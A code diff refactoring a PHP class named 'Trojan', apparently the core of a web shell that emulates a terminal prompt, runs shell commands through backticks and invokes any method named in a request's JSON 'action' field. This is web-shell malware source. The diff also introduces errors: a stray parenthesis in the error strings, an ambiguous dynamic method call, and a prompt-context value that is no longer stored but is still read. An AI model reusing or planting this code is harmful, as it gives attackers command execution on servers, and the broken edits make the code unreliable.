@@ -13,11 +13,8 @@ class Trojan{
      */
     public function __construct(){
         # emulate cwd persistence
-        if(isset($_SESSION['cwd'])){
-            $this->cwd = $_SESSION['cwd'];
-        } else {
-            $this->cwd = trim(`pwd`);
-        }
+        $this->cwd = (isset($_SESSION['cwd'])) ? $_SESSION['cwd'] : trim(`pwd`);
+
         # require that a context always be set
         $this->response['prompt_context'] = $this->get_prompt_context();
     }
@@ -36,18 +33,16 @@ class Trojan{
 
         # otherwise, simply invoke the method directly
         else {
-            # metaprogramming FTW
-            $method = $json['action'];
-
             # verify that the method exists before attempting to invoke it
-            if(method_exists($this, $method)){
-                $this->$method($json['args']);
+            # metaprogramming FTW
+            if(method_exists($this, $json['action'])){
+                $this->$json['action']($json['args']);
             }
             # if the method doesn't exist, send back an error message
             else {
                 $this->response = array(
-                    'error'          => "$method unsupported.",
-                    'output'         => "$method unsupported.",
+                    'error'          => "{$json['action'])} unsupported.",
+                    'output'         => "{$json['action'])} unsupported.",
                     'prompt_context' => $this->prompt_context,
                 );
                 $this->send_response();
@@ -106,12 +101,10 @@ class Trojan{
      * @return string $prompt_context  The prompt context
      */
     private function get_prompt_context(){
-        // assemble the prompt context
         $whoami               =  trim(`whoami`);
         $hostname             =  gethostname();
         $line_terminator      =  ($whoami ===  'root') ? '#' : '$' ;
-        $this->prompt_context =  "{$whoami}@{$hostname}:{$this->cwd}{$line_terminator}";
-        return $this->prompt_context;
+        return "{$whoami}@{$hostname}:{$this->cwd}{$line_terminator}";
     }
 
 
